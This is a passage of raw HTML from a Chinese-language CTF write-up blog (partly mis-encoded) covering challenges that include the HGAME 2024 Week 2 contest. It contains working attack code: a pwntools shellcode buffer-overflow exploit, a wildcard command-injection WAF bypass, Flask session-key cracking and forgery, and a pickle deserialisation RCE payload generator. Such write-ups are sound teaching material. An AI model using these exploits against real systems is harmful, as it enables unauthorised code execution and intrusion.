class="hljs-symbol">&amp;#121;</span><span class="hljs-symbol">&amp;#61;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#111;</span><br></code></pre></td></tr></table></figure><p>html å®ä½“è§£ç </p><p><img src="/posts/14e77824/image-20240301190915127.png" alt="image-20240301190915127"></p><p>æ ¹æ®å‰å››ä¸ªå­—æ¯ flag åˆ¤æ–­</p><p><img src="/posts/14e77824/image-20240301191157026.png" alt="image-20240301191157026"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ç®€å•çš„æ•°å­¦é¢˜"><a href="#ç®€å•çš„æ•°å­¦é¢˜" class="headerlink" title="ç®€å•çš„æ•°å­¦é¢˜"></a>ç®€å•çš„æ•°å­¦é¢˜</h2><p>ncä¸Šå»ç®—ä¸‰é“æ•°å­¦é¢˜å°±è¡Œ</p><h2 id="Easy-Shellcode"><a href="#Easy-Shellcode" class="headerlink" title="Easy_Shellcode"></a>Easy_Shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>, <span class="hljs-number">31977</span>)<span class="hljs-comment">#process(&quot;./easy-shellcode&quot;)</span><br><br>buf_addr = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(buf_addr)<br>shellcode_addr = <span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>) + <span class="hljs-number">32</span>  <br><br><br>shellcode = asm(shellcraft.sh())<br><br>payload = shellcode + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x100</span> + <span class="hljs-number">0x8</span> - <span class="hljs-built_in">len</span>(shellcode)) + p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>))<br><span class="hljs-comment">#p.recv()</span><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="æ¥æ‰“CSå’¯"><a href="#æ¥æ‰“CSå’¯" class="headerlink" title="æ¥æ‰“CSå’¯"></a>æ¥æ‰“CSå’¯</h2><p>åœ¨çº¿ç½‘ç«™<a href="https://s.threatbook.com/">å¾®æ­¥åœ¨çº¿äº‘æ²™ç®± (threatbook.com)</a></p><p>åˆ†æç½‘ç»œè¡Œä¸ºå³å¯</p><p><img src="/posts/14e77824/image-20240229202238639.png" alt="image-20240229202238639"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CTFer-Revenge"><a href="#CTFer-Revenge" class="headerlink" title="CTFer Revenge"></a>CTFer Revenge</h2><p>é¢˜ç›®å¤ªé•¿è´´ä¸ªå›¾ç‰‡å§</p><p><img src="/posts/14e77824/image-20240229202503571.png" alt="image-20240229202503571"></p><p>ç»å¸¸ä½¿ç”¨ hex editor çš„åº”è¯¥å¾ˆç†Ÿæ‚‰</p><p>æ ¹æ®æç¤º <code>ä»åæ–¹å‘å¼€å§‹ç§»åŠ¨ï¼Œ å›åˆ°å½“åˆçˆ±ä½ çš„æ—¶ç©º</code></p><p>ä»å°¾å·´å¼€å§‹çœ‹</p><p><img src="/posts/14e77824/image-20240229202608307.png" alt="image-20240229202608307"></p><p>å¯ä»¥å‘ç°ç†Ÿæ‚‰çš„PKæ–‡ä»¶å¤´</p><p>å¯çŸ¥ä¸º zipæ–‡ä»¶</p><p>å†™è„šæœ¬è½¬ç½®ä¸€ä¸‹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_string</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Reverse the given string.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> string[::-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_lines</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Read lines from input_file, remove first 9 characters, reverse each line, and write to output_file.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin, <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        lines = fin.readlines()<br><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(lines):<br>            <span class="hljs-comment"># Remove first 9 characters and reverse the line</span><br>            start_index = line.find(<span class="hljs-string">&quot;|&quot;</span>)<br>            end_index = line.rfind(<span class="hljs-string">&quot;|&quot;</span>)<br>            <span class="hljs-keyword">if</span> start_index != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> end_index != -<span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># Remove content between &#x27;|&#x27; and reverse the line</span><br>                reversed_line = reverse_string(<br>                    line[:start_index] + line[end_index + <span class="hljs-number">1</span> :].strip()<br>                )<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># If &#x27;|&#x27; is not found or only one &#x27;|&#x27; is found, reverse the entire line</span><br>                reversed_line = reverse_string(line.strip())<br>            <span class="hljs-comment"># Write reversed line to output file</span><br>            fout.write(reversed_line[<span class="hljs-number">9</span>:] + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    input_file = <span class="hljs-string">&quot;a.txt&quot;</span><br>    output_file = <span class="hljs-string">&quot;c.txt&quot;</span><br><br>    reverse_lines(input_file, output_file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Lines reversed and written to&quot;</span>, output_file)<br><br></code></pre></td></tr></table></figure><p>è°ƒæ•´ä¸‹æ‰‹åŠ¨å†™å…¥å˜æˆ zip æ–‡ä»¶</p><p>æœ‰å¯†ç åŠ å¯†<img src="/posts/14e77824/image-20240229202937794.png" alt="image-20240229202937794"></p><p>æ ¹æ®æç¤º</p><p>ä½¿ç”¨  APCHPR çˆ†ç ´</p><p><img src="/posts/14e77824/image-20240229203131201.png" alt="image-20240229203131201"></p><h2 id="å¤šæƒ…"><a href="#å¤šæƒ…" class="headerlink" title="å¤šæƒ…"></a>å¤šæƒ…</h2><p>å›¾ç‰‡ foremost å‡ºæ–°å›¾ç‰‡</p><p>å­˜åœ¨ crc é”™è¯¯ï¼Œæ‰¾ä¸ªè„šæœ¬çˆ†ç ´ï¼Œä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./00000013.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> image_data:<br>    bin_data = image_data.read()<br>data = <span class="hljs-built_in">bytearray</span>(bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br>crc32key = <span class="hljs-number">0x51F95FB8</span><br><span class="hljs-comment"># ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…ï¼Œ0x0fffå°±å·®ä¸å¤šäº†</span><br>n = <span class="hljs-number">4096</span><br><span class="hljs-comment"># é«˜å’Œå®½ä¸€èµ·çˆ†ç ´</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-comment"># qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚</span><br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x + <span class="hljs-number">4</span>] = width[x]<br>            data[x + <span class="hljs-number">8</span>] = height[x]<br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">&quot;width:%s  height:%s&quot;</span><br>                % (<span class="hljs-built_in">bytearray</span>(width).<span class="hljs-built_in">hex</span>(), <span class="hljs-built_in">bytearray</span>(height).<span class="hljs-built_in">hex</span>())<br>            )<br>            exit()<br><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/00000013.png" alt="00000013"></p><p>å¾—åˆ°æç¤º</p><p>æ ¹æ®zip 0 1 çŒœæµ‹ äºŒè¿›åˆ¶</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">1111100100 // 996<br><br>ç¬¬äºŒä¸ªé›¶bn<br><br>ç¬¬äºŒä¸ªä¸€p5<br><br>ç¬¬å…­ä¸ªä¸€f6H<br><br>ç¬¬ä¸‰ä¸ªé›¶QS<br><br>ç¬¬ä¸‰ä¸ªä¸€mJ<br><br>ç¬¬å››ä¸ªé›¶Nh<br><br>ç¬¬å››ä¸ªä¸€cd<br><br>ç¬¬äº”ä¸ªä¸€Eb<br><br>ç¬¬ä¸€ä¸ªé›¶bv2<br><br>ç¬¬ä¸€ä¸ªä¸€Lr<br><br>Lrp5mJcdEbbv2bnf6HQSNh<br></code></pre></td></tr></table></figure><p>å‡ºäº†åŠå¤©ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°è¿™å°±æ˜¯flagäº†</p><h2 id="å°å…‰çš„ç­”æ¡ˆä¹‹ä¹¦"><a href="#å°å…‰çš„ç­”æ¡ˆä¹‹ä¹¦" class="headerlink" title="å°å…‰çš„ç­”æ¡ˆä¹‹ä¹¦"></a>å°å…‰çš„ç­”æ¡ˆä¹‹ä¹¦</h2><p>é¦–å…ˆ</p><p><img src="/posts/14e77824/ccd8ad81c543efb97893c4d10d8cca34_720.png"></p><p>åæ¥æœç´¢åˆ°</p><p><img src="/posts/14e77824/image-20240301185136327.png" alt="image-20240301185136327"></p><p>å¾—åˆ°å¯†ç ä¸ºï¼š<code>life</code></p><p><img src="/posts/14e77824/40dd801b5622186fdbb2f42d32cbf770.png" alt="40dd801b5622186fdbb2f42d32cbf770"></p><p>å…³æ³¨å³å¯</p><h2 id="ez-model"><a href="#ez-model" class="headerlink" title="ez_model"></a>ez_model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><br><span class="hljs-comment"># é‡æ–°å®šä¹‰æ¨¡å‹ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModel</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MyModel, self).__init__()<br>        <span class="hljs-comment"># å·ç§¯å±‚</span><br>        self.conv1 = nn.Conv2d(<br>            in_channels=<span class="hljs-number">3</span>, out_channels=<span class="hljs-number">16</span>, kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">1</span><br>        )<br>        self.conv2 = nn.Conv2d(<br>            in_channels=<span class="hljs-number">16</span>, out_channels=<span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">1</span><br>        )<br>        <span class="hljs-comment"># å…¨è¿æ¥å±‚</span><br>        self.fc = nn.Linear(<span class="hljs-number">32</span> * <span class="hljs-number">32</span> * <span class="hljs-number">32</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># å‡è®¾è¾“å…¥å°ºå¯¸æ˜¯32x32ï¼Œè¾“å‡ºç±»åˆ«æ•°ä¸º10</span><br>        <span class="hljs-comment"># æ·»åŠ é¢å¤–çš„é”®</span><br>        self.flag = nn.Parameter(torch.zeros(<span class="hljs-number">54</span>))  <span class="hljs-comment"># å‡è®¾flagæ˜¯ä¸€ä¸ªæ ‡é‡å¼ é‡</span><br>        self.hint = nn.Parameter(torch.zeros(<span class="hljs-number">64</span>))  <span class="hljs-comment"># å‡è®¾hintæ˜¯ä¸€ä¸ªæ ‡é‡å¼ é‡</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = torch.relu(self.conv1(x))<br>        x = torch.relu(self.conv2(x))<br>        x = x.view(x.size(<span class="hljs-number">0</span>), -<span class="hljs-number">1</span>)  <span class="hljs-comment"># å°†å¼ é‡å±•å¹³æˆä¸€ç»´å‘é‡</span><br>        x = self.fc(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br><span class="hljs-comment"># åˆ›å»ºæ–°çš„æ¨¡å‹å®ä¾‹</span><br>model = MyModel()<br><br><span class="hljs-comment"># åŠ è½½.pthæ–‡ä»¶åˆ°æ¨¡å‹ä¸­</span><br>path = <span class="hljs-string">&quot;easy.pth&quot;</span>  <span class="hljs-comment"># æ›¿æ¢æˆä½ çš„.pthæ–‡ä»¶çš„è·¯å¾„</span><br>checkpoint = torch.load(path)<br><br><span class="hljs-comment"># ä»æ£€æŸ¥ç‚¹ä¸­æå–å‚æ•°å¹¶åŠ è½½åˆ°æ¨¡å‹ä¸­</span><br>model.load_state_dict(checkpoint)<br><br><span class="hljs-built_in">print</span>(checkpoint[<span class="hljs-string">&quot;hint&quot;</span>])<br><br><span class="hljs-built_in">print</span>(checkpoint[<span class="hljs-string">&quot;flag&quot;</span>]) <br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/posts/14e77824/image-20240301215630685.png" alt="image-20240301215630685"></p><p>è½¬æˆasciiå¾—</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">hint: ZzYyXxAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWw0123456789+/<br>flag: LidUJ3fQM2FVJoxpDwLvDyF3DwpPdwxOEgbQJoxnEgdnJgnojoZ5mF<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <a href="https://cyberchef.org/">Cyberchef</a></p><p><img src="/posts/14e77824/image-20240301215818418.png" alt="image-20240301215818418"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-2024-WEEK-2 WriteUps</title>
    <link href="/posts/feba5816/"/>
    <url>/posts/feba5816/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><p>åŸæœ¬ä»¥ä¸º xss ï¼Œåæ¥å°è¯•å‘ç°æ˜¯å†…æ•›æ‰§è¡Œ</p><p><img src="/posts/feba5816/image-20240221231654973.png" alt="image-20240221231654973"></p><p>å°è¯•ç›´æ¥ cat å‘ç° wafäº†</p><p>è¿™é‡Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡</p><p>CMD: <code>/???/c?t /fl?g_is_here/?l?g_??????</code></p><p><img src="/posts/feba5816/image-20240221232119179.png" alt="image-20240221232119179"></p><h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first â†“</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ ¹æ® Tips çŒœæµ‹ currentTime ä¸ºç¯å¢ƒå¯åŠ¨æ—¶é—´ï¼Œç§’æ•°éå†ä¸€ä¸‹ä½¿ç”¨<code>flask_session_cookie_manager</code>éªŒè¯å¾—åˆ° SECRET_KEY</p><p><img src="/posts/feba5816/image-20240221233312801.png" alt="image-20240221233312801"></p><p>ç„¶åä¼ªé€  SECRET_KEY ä½¿ username ä¸º admin</p><p><img src="/posts/feba5816/image-20240221233432146.png" alt="image-20240221233432146"></p><p>ç„¶åç®€å•çš„ pickle å‘½ä»¤æ‰§è¡Œä¸€ä¸‹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd = <span class="hljs-string">&quot;ls&quot;</span>  <span class="hljs-comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>        s = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="hljs-built_in">format</span>(cmd)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (s,))  <span class="hljs-comment"># reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span><br><br><br>poc = pickle.dumps(genpoc())<br><span class="hljs-built_in">print</span>(base64.b64encode(poc)) <br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">gASVPwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwjX19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCmUhZRSlC4=<br></code></pre></td></tr></table></figure><p><img src="/posts/feba5816/image-20240221234808147.png" alt="image-20240221234808147"></p><p><code>cat /flag</code> å¾—åˆ°</p><p><img src="/posts/feba5816/image-20240221234856822.png" alt="image-20240221234856822"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h2><p>ç‚¹å¼€å‘ç°è¯·æ±‚å›¾ç‰‡ï¼Œç‚¹å‡» Response</p><p><img src="/posts/feba5816/image-20240221235056870.png" alt="image-20240221235056870"></p><p>å¯ä»¥çœ‹å‡ºæ•°æ®ä¸ºå›¾ç‰‡</p><p><img src="/posts/feba5816/image-20240221235419338.png" alt="image-20240221235419338"></p><p>å¾—åˆ° flag</p><p><img src="/posts/feba5816/image-20240221235646520.png" alt="image-20240221235646520"></p><h2 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h2><p>å¥½éº»çƒ¦ï¼Œæ™•</p><p>æŠŠ docx åç¼€æ”¹ä¸º zip æ‰“å¼€</p><p><img src="/posts/feba5816/image-20240222000304893.png" alt="image-20240222000304893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs æ­å–œ.txt">æ­å–œä½ æ‰¾åˆ°äº†è¿™äº›ä¸œè¥¿ï¼Œç°åœ¨ä½ ç¦»flagåªå·®è§£å¼€è¿™ä¸ªæ–°çš„å‹ç¼©åŒ…ï¼Œç„¶åå¯¹å‹ç¼©åŒ…é‡Œçš„ä¸œè¥¿è¿›è¡Œä¸¤å±‚è§£å¯†å°±èƒ½è·å¾—flagäº†ã€‚å‹ç¼©åŒ…çš„å¯†ç å’Œæˆ‘æ”¾åœ¨è¿™çš„ä¸¤å¼ å›¾ç‰‡æœ‰å…³ã€‚<br></code></pre></td></tr></table></figure><p>æŸ¥é˜…èµ„æ–™çŒœæµ‹æ˜¯ç›²æ°´å°åŠ å¯†</p><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/chishaxie/BlindWaterMark">chishaxie&#x2F;BlindWaterMark: ç›²æ°´å° by python (github.com)</a></p><p>ä½œè€…ç»™çš„ requirements.txt æˆ‘å¼„ä¸å¥½</p><p>è¿™é‡Œä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install opencv-python<br>python -m pip install matplotlib<br></code></pre></td></tr></table></figure><p><img src="/posts/feba5816/image-20240222002940423.png" alt="image-20240222002940423"></p><p><img src="/posts/feba5816/result.png" alt="result"></p><p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç  <code>T1hi3sI4sKey</code></p><p>å¾—åˆ°</p><details>    <summary>secret.txt</summary><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 